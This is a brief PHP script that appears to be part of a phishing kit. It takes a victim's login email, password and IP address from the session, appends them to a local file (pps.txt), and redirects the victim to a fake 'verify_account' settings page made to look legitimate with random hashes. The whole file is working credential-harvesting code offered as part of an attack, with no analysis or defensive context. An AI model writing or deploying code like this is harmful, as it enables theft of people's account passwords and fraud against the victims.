<?php



session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
$handle = fopen('../../../../pps.txt', 'a');

$Z118_MESSAGE .= "".$_SESSION['_login_email_']." - ".$_SESSION['_login_password_']." - ".$_SESSION['_ip_']."
";
   fwrite($handle, $Z118_MESSAGE);
    fclose($handle);
		HEADER("Location: ../settings/?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>